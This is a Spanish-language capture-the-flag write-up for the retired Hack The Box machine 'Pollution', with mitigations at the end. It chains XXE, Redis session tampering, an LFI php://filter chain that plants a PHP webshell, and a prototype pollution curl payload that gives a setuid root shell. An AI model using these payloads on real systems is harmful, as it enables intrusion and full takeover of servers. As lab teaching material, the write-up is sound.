---
machine: Pollution
os: Linux
difficulty: Hard
platform: Hack The Box
state: Retired
tags: [linux, web, xxe, redis, php-fpm, prototype-pollution, privesc]
---

# Pollution — Hack The Box (Linux)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

Un token en el foro permite ser admin y llegar a un XXE que lee el código fuente. Con la sesión en Redis se accede a `developers.collect.htb`, donde un LFI con filter injection da RCE. PHP-FPM y la sesión de `victor` permiten entrar por SSH; la API `pollution_api` es vulnerable a prototype pollution y ejecuta como root.

## Reconocimiento

```bash
nmap -Pn -sCV -p22,80,6379 <IP>
```

- `22` SSH, `80` nginx y `6379` Redis sin autenticación.
- `ffuf` descubre `forum.collect.htb` y `developers.collect.htb`.
- El foro tiene un ZIP de Burp con un token de un post.

## Enumeración

- El token del historial de Burp eleva la cuenta a administrador.
- El panel admin tiene un endpoint XML vulnerable a XXE.
- El XXE lee el código fuente y la configuración de Redis.

## Foothold

Se usa el XXE para leer `/var/www/collect/public/index.php` y las sesiones. Con Redis se modifica el rol de la sesión y se entra a `developers.collect.htb`; el `.htpasswd` se crackea.

```bash
redis-cli -h <IP> keys '*'
redis-cli -h <IP> get 'PHPREDIS_SESSION:<ID>'
```

## Movimiento lateral

El portal de desarrolladores incluye un parámetro vulnerable a LFI. Se usa `php://filter` con cadenas de conversión para escribir un webshell y ejecutar como `www-data`; la sesión de `victor` y PHP-FPM dan acceso SSH.

```bash
php-filter-chain-generator '<?php system($_GET[0]); ?>' > chain.txt
```

## Escalada de privilegios

`pollution_api` es una API Node.js en desarrollo que mezcla JSON sin filtrar `__proto__`. Se contamina `Object.prototype` con una opción de `child_process` y se ejecuta un comando como root.

```bash
curl -s -X POST 'http://127.0.0.1:3000/' -H 'Content-Type: application/json' --data '{"text":"x","__proto__":{"shell":"/proc/self/exe","argv0":"console.log(require(\"child_process\").execSync(\"cp /bin/bash /tmp/0xdf && chmod 4777 /tmp/0xdf\"))//","NODE_OPTIONS":"--require /proc/self/cmdline"}}'
/tmp/0xdf -p
```

## Evidencia

- Token del foro y XXE con lectura de código.
- Sesión en Redis y acceso a developers.
- LFI con filter injection y PHP-FPM.
- Prototype pollution y shell root.

## Lecciones aprendidas

- Un token filtrado en un backup de Burp puede elevar privilegios.
- Las sesiones en Redis son manipulables si Redis está expuesto.
- La prototype pollution puede llegar a RCE si una librería mezcla JSON sin filtrar.

## Mitigación y detección

- No publicar backups de Burp ni tokens; proteger Redis.
- Validar y normalizar rutas; evitar `php://filter` en includes.
- Rechazar `__proto__` y `constructor` en JSON; actualizar dependencias.

## Referencias

- [0xdf — Pollution](https://0xdf.gitlab.io/2023/07/01/htb-pollution.html)
- [IppSec — Pollution](https://www.youtube.com/watch?v=dQt5iRFtgAY)
- [Hack The Box — Pollution](https://app.hackthebox.com/machines/pollution)
